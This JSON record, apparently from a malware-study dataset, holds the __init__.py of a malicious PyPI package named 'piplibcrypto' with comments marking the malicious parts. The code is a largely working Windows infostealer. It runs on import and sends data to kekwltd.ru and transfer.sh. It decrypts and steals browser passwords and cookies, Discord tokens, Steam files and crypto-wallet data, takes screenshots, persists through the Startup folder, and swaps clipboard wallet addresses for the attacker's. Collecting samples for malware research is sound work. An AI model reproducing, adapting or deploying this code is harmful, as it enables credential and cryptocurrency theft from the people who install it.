[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/piplibcrypto-1.2.0-py3-none-any/piplibcrypto/__init__.py",
    "malicious_code": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious code starts here ---\n\n# 1. Install dependencies (potentially to ensure malware runs)\nos.system(\"pip install requests httpx\")\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# 2. Initial exfiltration of PC username to C2\nhttpx.post(\"https://kekwltd.ru/relay/download\", json={\n    'embeds': [{\n        \"title\": \"Someone Tried to download\",\n        \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n    }]\n})\n\n# 3. Malicious configuration (C2, crypto addresses, anti-debug, etc.)\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg': [ ... ] # anti-debug/VM process names\n}\n\n# 4. Clipboard crypto address stealer\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other crypto regexes omitted for brevity)\n        except:\n            pass\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# 5. Main stealer class: browser data, tokens, system info, screenshot, exfiltration\nclass bc_initial_func:\n    def __init__(self):\n        # ... (init code omitted for brevity)\n        self.discord_webhook = __config__['yourwebhookurl']\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        # ...\n    def startupkekw(self):\n        if self.startupexe == \"yes\":\n            startup_path = os.getenv(\"appdata\") + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n            if os.path.exists(startup_path + argv[0]):\n                os.remove(startup_path + argv[0])\n                copy2(argv[0], startup_path)\n            else:\n                copy2(argv[0], startup_path)\n    async def init(self):\n        # ...\n        self.error_remote()\n        self.startupkekw()\n        # ...\n        function_list = [self.steal_screen, self.system_informations, self.steal_token, self.grabb_mc, self.grabb_roblox]\n        # ...\n        for func in function_list:\n            process = threading.Thread(target=func, daemon=True)\n            process.start()\n        for t in threading.enumerate():\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n        self.natify_matched_tokens()\n        self.ping_on_running()\n        self.finished_bc()\n    def steal_token(self):\n        # ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            # ...\n            for filname in os.listdir(path):\n                if filname[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                    for token in re.findall(self.regex, line):\n                        try:\n                            r = requests.get(self.baseurl, headers={\n                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                'Content-Type': 'application/json',\n                                'Authorization': token})\n                        except Exception:\n                            pass\n                        if r.status_code == 200:\n                            uid = r.json()['id']\n                            if uid not in self.bc_id:\n                                self.tokens.append(token)\n                                self.bc_id.append(uid)\n        # ...\n    def steal_passwords2(self, name: str, path: str, profile: str):\n        # ...\n        with open(os.path.join(self.dir, \"Browsers\", \"All Passwords.txt\"), 'a', encoding=\"utf-8\") as f:\n            for res in cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\n                url, username, password = res\n                password = self.dcrpt_val(password, self.masterkey)\n                if url != \"\":\n                    f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {password}\\n\\n\")\n        # ...\n    def steal_cookies2(self, name: str, path: str, profile: str):\n        # ...\n        with open(os.path.join(self.dir, \"Browsers\", \"All Cookies.txt\"), 'a', encoding=\"utf-8\") as f:\n            for res in cursor.execute(\"SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies\").fetchall():\n                host_key, name, path, encrypted_value, expires_utc = res\n                value = self.dcrpt_val(encrypted_value, self.masterkey)\n                if host_key and name and value != \"\":\n                    f.write(\"{}\\t{}\\t{}\\t{}\\t{}\\t{}\\t{}\\n\".format(\n                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))\n        # ...\n    def steal_passwords(self):\n        # ...\n        for prof in os.listdir(self.chrmmuserdtt):\n            if re.match(self.chrmrgx, prof):\n                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Login Data')\n                login = self.cr34t3_f1lkes()\n                shutil.copy2(login_db, login)\n                conn = sqlite3.connect(login)\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n                for r in cursor.fetchall():\n                    url = r[0]\n                    username = r[1]\n                    encrypted_password = r[2]\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\n                    if url != \"\":\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\n                cursor.close()\n                conn.close()\n                os.remove(login)\n        f.close()\n    def steal_cookies(self):\n        # ...\n        for prof in os.listdir(self.chrmmuserdtt):\n            if re.match(self.chrmrgx, prof):\n                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Network', 'cookies')\n                login = self.cr34t3_f1lkes()\n                shutil.copy2(login_db, login)\n                conn = sqlite3.connect(login)\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT host_key, name, encrypted_value from cookies\")\n                for r in cursor.fetchall():\n                    host = r[0]\n                    user = r[1]\n                    decrypted_cookie = self.dcrpt_val(r[2], self.chrome_key)\n                    if host != \"\":\n                        f.write(f\"{host}\\tTRUE\"+\"\\t\\t\"+ f\"/FALSE\\t2597573456\\t{user}\\t{decrypted_cookie}\\n\")\n                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:\n                        self.robloxcookies.append(decrypted_cookie)\n                cursor.close()\n                conn.close()\n                os.remove(login)\n        f.close()\n    def steal_screen(self):\n        image = ImageGrab.grab(\n            bbox=None,\n            include_layered_windows=False,\n            all_screens=True,\n            xdisplay=None\n        )\n        image.save(self.dir + \"\\\\Screenshot.png\")\n        image.close()\n    def system_informations(self):\n        about = f\"\"\"\n{infocom} | {vctm_pc}\nWindows key: {self.w1nk33y}\nWindows version: {self.w1nv3r}\nRAM: {r4m}GB\nDISK: {d1sk}GB\nHWID: {self.uuidwndz}\nIP: {self.ip}\nCity: {self.city}\nCountry: {self.country}\nRegion: {self.region}\nOrg: {self.org}\nGoogleMaps: {self.googlemap}\n        \"\"\"\n        with open(self.dir + \"\\\\System_Info.txt\", \"w\", encoding=\"utf-8\", errors='ignore') as f:\n            f.write(about)\n    def finished_bc(self):\n        for i in os.listdir(self.dir):\n            if i.endswith('.txt'):\n                path = self.dir + self.sep + i\n                with open(path, \"r\", errors=\"ignore\") as ff:\n                    x = ff.read()\n                    if not x:\n                        ff.close()\n                        os.remove(path)\n                    else:\n                        with open(path, \"w\", encoding=\"utf-8\", errors=\"ignore\") as f:\n                            f.write(\"KEKWLTD | https://kekwltd.ru\\n\\n\")\n                        with open(path, \"a\", encoding=\"utf-8\", errors=\"ignore\") as fp:\n                            fp.write(x + \"\\n\\nKEKWLTD | https://kekwltd.ru\")\n        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        # ...\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# 6. Additional stealer logic: generic browser/crypto/steam wallet stealer, file search, exfiltration\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\ndef fetch_conf(e: str) -> str or bool | None:\n    return __config__.get(e)\n\nhook = fetch_conf(\"yourwebhookurl\")\n\n# ...\n\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    # ...\n    path = name\n    files = {'file': open(path, 'rb')}\n    # ...\n    LoadRequests(\"POST\", hook, files=files)\n\n# ...\n\ndef getPassw(path, arg):\n    global Passw\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords: paswWords.append(old)\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\n    writeforfile(Passw, 'bc_allpasswords')\n\ndef getCookie(path, arg):\n    global Cookies\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords: cookiWords.append(old)\n            Cookies.append(f\"{row[0]}\\tTRUE\"+\"\\t\\t\"+ f\"/FALSE\\t2597573456\\t{row[1]}\\t{DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies, 'bc_allcookies')\n\ndef ZipThings(path, arg, procc):\n    pathC = path\n    name = arg\n    if \"aholpfdialjgjfhomihkjbmgjidlcdno\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Exodus_{browser}\"\n        pathC = path + arg\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    if not os.path.exists(pathC): return\n    if checkIfProcessRunning('chrome.exe'):\n        subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"{browser}\"\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\n\ndef grabb_GatherAll():\n    browserPaths = [ ... ]\n    Paths_zipped = [ ... ]\n    for patt in browserPaths:\n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies: thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True: return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [ ... ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\n\ngrabb_GatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"bc_checking\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n# --- Malicious code ends here ---"
  }
]